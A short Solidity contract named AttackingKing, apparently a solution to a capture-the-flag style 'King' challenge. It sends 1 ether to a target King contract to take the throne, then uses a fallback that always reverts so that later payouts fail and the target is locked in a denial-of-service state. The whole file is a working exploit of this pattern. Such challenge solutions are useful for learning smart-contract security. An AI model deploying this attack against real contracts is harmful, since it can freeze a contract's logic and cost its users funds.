// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    address public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        (bool success,) = contractAddress.call{value: 1 ether}(""); // Set this contract as the new king.
        require(success, "hack did not work...");
    }

    fallback() external payable {
        // Catch King.transfer and revert the tx.
        revert("you cannot be the king");
    }
}
